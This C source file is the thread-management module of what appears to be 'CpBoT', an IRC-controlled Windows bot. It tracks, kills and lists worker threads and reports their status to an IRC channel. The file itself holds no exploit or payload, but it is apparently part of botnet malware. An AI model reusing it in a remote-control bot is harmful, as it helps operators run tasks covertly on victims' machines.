//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

#include "includes.h"
#include "functions.h"

THREAD threads[MAX_THREADS];

int addthread(int id, char *name,...)
{
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,name); 
	_vsnprintf(tbuffer,sizeof(tbuffer),name,argp);
	
	int i;
	for (i = 0; i < MAX_THREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy(threads[i].name, tbuffer, sizeof(threads[i].name)-1);
			threads[i].id=id;
			threads[i].parent=0;
			threads[i].pid=0;
			break;
		}
	}
	return i;
}

BOOL killthread(int threadnum)
{
	BOOL threadkilled = FALSE;

	if ((threadnum>0) && (threadnum<MAX_THREADS))
	{
		TerminateThread(threads[threadnum].tHandle, 0);
		if (threads[threadnum].tHandle != 0) 
			threadkilled = TRUE;

		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;

#ifndef NO_PROCESS
		if(threads[threadnum].pid > 0)
			KillPid(threads[threadnum].pid);
#endif

		threads[threadnum].pid = 0; 
		threads[threadnum].name[0] = '\0';
		fclosesocket(threads[threadnum].csock);
		threads[threadnum].csock = 0;
	}

	return threadkilled;
}

int killthreadall(void)
{
	int numthreads=0;

	for (int i = 0; i < MAX_THREADS; i++)
		if (threads[i].name[0] != '\0')
			if (killthread(i))
				numthreads++;

	return numthreads;
}

int killthreadid(int threadid, int threadnum)
{
	int numthreads=0;

	for (int i=0;i<MAX_THREADS;i++)
	{
		if (threads[i].id == threadid)
		{
			if (threadnum > 0)
			{
				if (threads[i].parent == threadnum || i == threadnum)
					if (killthread(i)) 
						numthreads++;
			}
			else 
			{
				if (killthread(i)) 
					numthreads++;
			}
		}
	}

	return numthreads;
}

void clearthread(int threadnum)
{
	threads[threadnum].tHandle = 0;
	threads[threadnum].id=0;
	threads[threadnum].parent=0;
	threads[threadnum].pid=0;
	threads[threadnum].csock=0;
	threads[threadnum].name[0]='\0';

	return;
}

void stopthread(char *target, void* conn, BOOL silent, BOOL verbose, char *thread, int threadid, char *desc)
{
	IRC* irc=(IRC*)conn;
	int threadnum=0, i;

	if(thread)
		threadnum=atoi(thread);

#ifdef _DEBUG
	printf("stopthread: s:%s\n",(silent?"T":"F"));
	printf("stopthread: T:%s\n",target);
#endif

	if ((i=killthreadid(threadid,threadnum)) > 0)
	{
		if (!silent)
			irc->privmsg(target,"%s %s thread stopped. (%d thread(s) stopped.)", threads_title, desc, i);
	}
	else
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s No %s thread found.", threads_title, desc);
	}

	return;
}

DWORD WINAPI ListThread(LPVOID param) 
{
	NTHREAD tlist = *((NTHREAD *)param);
	NTHREAD *tlistp = (NTHREAD *)param;
	tlistp->gotinfo = TRUE;
	
	IRC* irc=(IRC*)tlist.conn;

	irc->privmsg(tlist.target,"%s Thread List:", threads_title);
	for (int i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].name[0] != '\0' && (tlist.bdata1 || threads[i].parent == 0))
		{
			irc->privmsg(tlist.target,"%d. %s", i, threads[i].name);
		}
	}
	irc->privmsg(tlist.target,"%s End of list.", threads_title);
	clearthread(tlist.threadnum);
	ExitThread(0);
}

void listthreads(char *target, void* conn, BOOL verbose, BOOL full)
{
	IRC* irc=(IRC*)conn;

	if (verbose) irc->privmsg(target,"%s Thread List:", threads_title);

	for (int i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].name[0] != '\0' && (full || threads[i].parent == 0))
		{
			irc->privmsg(target,"%d. %s", i, threads[i].name);
		}
	}

	if (verbose) irc->privmsg(target,"%s End of list.", threads_title);

	return;
}

int findthreadid(int threadid)
{
	int numthreads=0;
	for (int i=0;i<MAX_THREADS;i++)
		if (threads[i].id == threadid)
			numthreads++;

	return numthreads;
}

int findthreadnum(int threadid)
{
	int threadnum=0;
	for (int i=0;i<MAX_THREADS;i++)
		if (threads[i].id == threadid)
		{
			threadnum=i;
			break;
		}

	return threadnum;
}
